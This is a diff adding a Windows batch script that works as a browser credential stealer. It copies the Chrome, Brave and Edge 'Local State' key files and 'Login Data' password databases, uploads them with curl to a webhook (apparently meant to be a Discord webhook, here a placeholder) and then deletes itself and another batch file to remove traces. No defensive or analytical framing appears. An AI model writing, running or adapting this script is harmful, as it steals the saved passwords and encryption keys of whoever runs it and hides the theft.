@@ -1,0 +1,34 @@
+@echo off
+
+setlocal enabledelayedexpansion
+
+REM Add Discord Webhook Url
+set WEBHOOKURL=example.com
+
+set files_to_upload=
+
+if exist "%LocalAppData%\Google\Chrome\User Data\Local State" (
+    copy "%LocalAppData%\Google\Chrome\User Data\Local State" chrols.txt
+    copy "%LocalAppData%\Google\Chrome\User Data\Default\Login Data" chrold.txt
+    set files_to_upload=!files_to_upload! -F "file1=@chrols.txt" -F "file2=@chrold.txt"
+)
+
+if exist "%LocalAppData%\BraveSoftware\Brave-Browser\User Data\Local State" (
+    copy "%LocalAppData%\BraveSoftware\Brave-Browser\User Data\Local State" bravls.txt
+    copy "%LocalAppData%\BraveSoftware\Brave-Browser\User Data\Default\Login Data" bravld.txt
+    set files_to_upload=!files_to_upload! -F "file3=@bravls.txt" -F "file4=@bravld.txt"
+)
+
+if exist "%LocalAppData%\Microsoft\Edge\User Data\Local State" (
+    copy "%LocalAppData%\Microsoft\Edge\User Data\Local State" edgls.txt
+    copy "%LocalAppData%\Microsoft\Edge\User Data\Default\Login Data" edgld.txt
+    set files_to_upload=!files_to_upload! -F "file5=@edgls.txt" -F "file6=@edgld.txt"
+)
+
+curl -X POST -H "Content-Type: multipart/form-data" ^
+     !files_to_upload! ^
+     !WEBHOOKURL!  
+
+REM Deletes the bat file from computer
+del "%~f0"
+DEL /F /Q "C:\Users\Public\f2.bat"
